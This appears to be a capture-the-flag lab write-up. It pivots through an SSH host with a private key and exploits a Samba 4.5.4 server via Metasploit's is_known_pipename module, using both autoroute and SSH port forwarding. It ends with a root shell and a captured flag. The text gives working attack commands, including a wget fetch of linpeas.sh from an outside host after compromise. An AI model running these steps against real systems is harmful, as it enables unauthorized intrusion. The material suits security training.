# 93b00a_remote_exploitation_2

When I scaned in the 10.0.7.225, I found the smb vulnerability.
```
nohup nmap -p- 10.0.7.0/24 > result.txt &
Nmap scan report for 10.0.7.127
Host is up (0.12s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
52961/tcp open  unknown

blade@en2720-w1-buckeye:~$ nmap -p445 -A 10.0.7.127
PORT    STATE SERVICE     VERSION
445/tcp open  netbios-ssn Samba smbd 4.5.4-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: EN2720-W1-CLOUD-HOPPER
```

We cannot access the 10.0.7.127 directly, there are 2 ways.

The first is to use metasploit autoroute.
```
use auxiliary/scanner/ssh/ssh_login_pubkey
set key_path /home/jinjia/client_attack/id_rsa_blade
set rhosts 10.0.7.225
set rport 52961
set username blade
run # equivalent to `run ssh://blade@10.0.7.225:52961 key_path=/home/jinjia/client_attack/id_rsa_blade1
sessions -u 1
sessions -i 2

meterpreter> run autoroute -p 
meterpreter> run autoroute -s 10.0.7.127
meterpreter> bg 

use exploit/linux/samba/is_known_pipename
set rhosts 10.0.7.127
exploit # get shell
ls /root
wget 192.168.0.7:8000/linpeas.sh
chmod +x linpeas.sh

```

The second is to use the local port forwarding. Now we can use Metasploit locally to hack the target by setting RHOST localhost and RPORT 19999
```
ssh -N -L 19999:10.0.7.127:445 -i id_rsa_blade blade@10.0.7.225 -p 52961

use exploit/linux/samba/is_known_pipename
set rhosts 127.0.0.1
set rport 19999
exploit # get shell
whoami
#root
ls /root
#flag{93b00ada9e8e98317bcf9f2dbcccb0b5c40bb92fc29c2c}.jpg

```